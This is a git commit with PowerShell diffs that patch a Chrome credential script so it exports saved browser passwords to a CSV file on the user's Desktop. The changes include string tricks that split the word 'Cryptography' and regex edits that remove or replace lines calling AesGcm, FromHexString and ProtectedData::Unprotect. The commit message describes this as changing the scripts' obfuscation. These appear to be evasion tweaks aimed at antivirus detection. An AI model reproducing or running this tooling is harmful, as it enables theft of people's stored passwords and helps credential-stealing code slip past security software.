14d62d3d18bf664c791f156340f7f091af7c8cb9
aleex-le-dev <jalias59@outlook.fr>
2026-03-06 20:08:37 +0100

    feat: Ajout d'un script de gestion des identifiants Chrome, mise à jour de la DLL SQLite et modification de la logique d'obfuscation des scripts.

--- generate_b64.ps1
+++ generate_b64.ps1
@@ -5,7 +5,8 @@ $patch = @"
 `$c = `$c -replace '\`$arrExp \| Format-Table', ('`$arrExp | Export-Csv -Path "`$env:USERPROFILE\Desktop\Chrome_Local_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !" -ForegroundColor Green')
 `$c = `$c -replace '#requires -version 7', ''
 `$c = `$c -replace '\[System\.Convert\]::FromHexString\([^)]*\)', '0x00'
-`$c = `$c -replace '\[AesGcm\]::new', '0x00'
+`$c = `$c -replace '(?m)^\s*\`$Script:GCMKey\s*=\s*\[AesGcm\]::new\([^)]*\).*`$', ''
+`$c = `$c -replace '(?m)^\s*\`$masterKey\s*=\s*\[ProtectedData\]::Unprotect\([^)]*\).*`$', ''
 `$c = `$c -replace 'System\.Security\.Cryptography', 'System.Security.Crypto''graphy'
 Set-Content 'run_chrome.ps1' -Value `$c
 "@
---
+++ patch_test.ps1
@@ -0,0 +1,8 @@
+$c = Get-Content 'chrome.ps1' -Raw
+$c = $c -replace '(?s)"Export".*?"Import"', '"Export" { } "Import"'
+$c = $c -replace '\$arrExp \| Format-Table', ('$arrExp | Export-Csv -Path "' + $HOME + '\Desktop\Chrome_Local_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !" -ForegroundColor Green')
+$c = $c -replace '#requires -version 7', ''
+$c = $c -replace '\[System\.Convert\]::FromHexString\([^)]*\)', '0x00'
+$c = $c -replace '\[AesGcm\]::new', '0x00'
+$c = $c -replace 'System\.Security\.Cryptography', 'System.Security.Crypto''graphy'
+Set-Content "v3.ps1" -Value $c
